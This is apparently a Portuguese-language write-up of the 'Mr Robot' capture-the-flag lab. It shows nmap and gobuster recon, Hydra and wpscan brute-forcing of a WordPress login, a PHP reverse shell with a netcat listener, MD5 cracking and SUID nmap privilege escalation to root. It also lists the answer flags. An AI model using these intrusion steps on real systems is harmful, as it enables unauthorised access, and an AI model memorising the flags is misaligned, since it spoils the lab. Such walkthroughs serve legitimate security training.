# Lab: Mr Robot (Medium Mode)

## Capture The Flags (CTF):

1. **What is key 1?** `073403c8a58a1f80d943455fb30724b9`
2. **What is key 2?** `822c73956184f694993bede3eb39f959`
3. **What is key 3?** `04787ddef27c3dee1ee161b21670b4e4`

---

## 1) Reconhecimento Inicial
```
export IP=10.10.200.166
```
```
nmap -A $IP
```
**Resultados:**
```
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

---

## 2) Enumeração de Diretórios
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$IP -x php,sh,txt,html,js,css,py
```
**Resultados Principais:**
- `/wp-login`  
- `/robots` → Contém `fsocity.dic` e `key-1-of-3.txt`
- `/key-1-of-3.txt` → FLAG: `073403c8a58a1f80d943455fb30724b9`

---

## 3) Análise de Wordlist
```bash
wc fsocity.dic  # Conta linhas/palavras/caracteres
```
```bash
ls -l  # Lista ficheiros e tamanhos
```
```bash
sort fsocity.dic | uniq > fsocityUniq.txt  # Ordena e remove duplicados
```

---

## 4) Ataque de Força Bruta (Burp Suite + Hydra)
```bash
wpscan --url 10.10.101.133 --passwords fsocityUniq.txt --usernames elliot
```
**Resultados:**
Username: Not Found!

```bash
hydra -L fsocityUniq.txt -p admin 10.10.200.166 http-post-form "/wp-login.php:log=^USER^&pass=^PASS^&wp-submit=LOG+In&redirect_to=http%3aA%2F%2F10.10.200.166%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
```
**Resultados:** 
Username: `elliot`

```bash
wpscan --url 10.10.101.133 --passwords fsocityUniq.txt --usernames elliot
```
**Credenciais Encontradas:**
- Username: `elliot`
- Password: `ER28-0652`

---

## 5) Reverse Shell via Editor PHP
```bash
cd /usr/share/webshells/php
```
```
cat php-reverse-shell.php > php-reverseshell.php
```
**Passos:**
1. Fazer upload do `php-reverseshell.php` no editor WordPress.
2. Iniciar listener:
```bash
nc -lnvp 9999
```
3. Aceder ao URL do ficheiro: `http://10.10.101.133/wp-content/themes/twentyfifteen/archive.php`

---

## 6) Escalada para Utilizador "robot"
```bash
whoami
cd home
cd robot
ls -l
cat password.raw-md5
```
**MD5 Encontrado:** `robot:c3fcd3d76192e4007dfb496cca67e13b`
**MD5 Descriptografado:** `abcdefghijklmnopqrstuvwxyz`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
su robot
```
**Password:** `abcdefghijklmnopqrstuvwxyz`
```bash
cat key-2-of-3.txt
```
**FLAG:** `822c73956184f694993bede3eb39f959`

---

## 7) Escalada de Privilégios para Root
```bash
find / -user root -perm -4000 2>/dev/null  # Identificar SUID bins
```
```bash
nmap --interactive
!sh
```
**Resultados:**
```bash
whoami  # root
cd /root
ls -l
cat key-3-of-3.txt
```
**FLAG Final:** `04787ddef27c3dee1ee161b21670b4e4`
